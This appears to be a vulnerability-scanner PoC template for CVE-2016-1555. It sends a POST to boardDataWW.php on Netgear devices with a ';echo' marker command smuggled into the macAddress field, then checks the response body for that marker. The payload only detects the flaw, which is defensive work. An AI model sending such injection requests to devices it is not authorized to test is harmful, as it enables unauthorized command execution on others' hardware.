[info]
author = "ave"
description = "通过向 boardDataWW.php 发送特制 POST 请求，在 macAddress 参数中注入 echo 命令，若响应包含回显字符串则证明存在命令注入漏洞。"
id = "POC-AVE-2016-0109"
name = "Netgear 多款设备未授权远程命令执行漏洞 PoC"
severity = "critical"
tags = ["ave-2016-0109"]
vuln_id = [
    "CVE-2016-1555",
    "AVE-2016-0109",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/boardDataWW.php"
protocol = "http"

[poc.requests.body]
content = "macAddress=112233445566%3Becho+9asd1sd2SXqwsxcas&reginfo=0&writeData=Submit"
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["9asd1sd2SXqwsxcas"]
